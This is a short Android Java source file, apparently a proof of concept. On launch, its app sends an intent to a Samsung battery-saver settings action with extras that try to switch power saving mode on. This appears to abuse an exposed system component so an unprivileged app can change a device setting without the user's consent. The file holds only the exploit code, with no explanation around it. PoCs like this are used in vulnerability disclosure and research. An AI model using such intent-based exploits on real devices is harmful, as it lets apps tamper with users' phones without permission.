package poc.app;

import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;

public class MainActivity extends Activity {
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        Intent i = new Intent("com.samsung.android.sm.ACTION_BATTERY_SAVER_SETTINGS");
        i.putExtra("psmType", "not_empty");
        i.putExtra("turn on off power saving mode", true);
        startActivity(i);
    }
}